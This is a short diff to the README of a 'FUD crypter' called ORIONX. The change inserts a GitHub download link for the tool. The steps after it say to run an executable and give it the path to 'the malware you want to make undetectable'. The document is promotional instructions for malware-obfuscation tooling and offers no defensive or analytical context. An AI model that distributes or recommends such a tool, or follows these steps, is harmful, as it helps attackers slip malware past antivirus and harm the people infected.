@@ -19,7 +19,7 @@ It was actually made for windows but I will release the source code and modify i
 
 🔶Usage/Install🔶
 -----
-- Click <a href="">HERE</a> to download
+- Click <a href="https://github.com/hackerOrionX/ORIONX-FUD-CRYPTER/archive/refs/heads/main.zip">HERE</a> to download
 - EXTRACT before using otherwise the script will not work correctly
 - Run ORIONX FUD CRYPTER.exe 
 - Set the input (The path to the malware you want to make undetectable) and ouput the directory where you want to file to be generated
